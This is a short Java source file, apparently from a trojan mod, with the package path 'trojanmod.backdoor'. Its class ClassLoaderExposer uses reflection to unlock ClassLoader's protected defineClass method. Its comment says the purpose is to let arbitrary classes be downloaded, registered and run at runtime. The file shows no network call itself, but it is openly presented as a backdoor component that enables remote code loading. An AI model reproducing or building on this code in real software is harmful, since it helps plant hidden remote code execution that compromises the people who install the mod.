package com.lanceg.trojanmod.backdoor;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.security.ProtectionDomain;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Exposes private and protected functions in {@link ClassLoader}. Right now, this class only exposes {@link ClassLoader#defineClass}.
 * Exposing this method allows arbitrary classes to be downloaded, registered and instantiated at runtime.
 * 
 * @author Lance G.
 */
public abstract class ClassLoaderExposer extends ClassLoader {
	private static final Logger LOGGER = LogManager.getLogger();	
	private static Method defineClassMethod;
	
	static {
		try {
			defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", String.class, ByteBuffer.class, ProtectionDomain.class);
			defineClassMethod.setAccessible(true);
		} catch (Exception e) {
			LOGGER.error(e.getMessage());
		}
	}
	
	public static Class<?> defineClass(final ClassLoader caller, final String name, final ByteBuffer bytes, final ProtectionDomain domain) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException {
		return (Class<?>) defineClassMethod.invoke(caller, name, bytes, domain);
	}
}
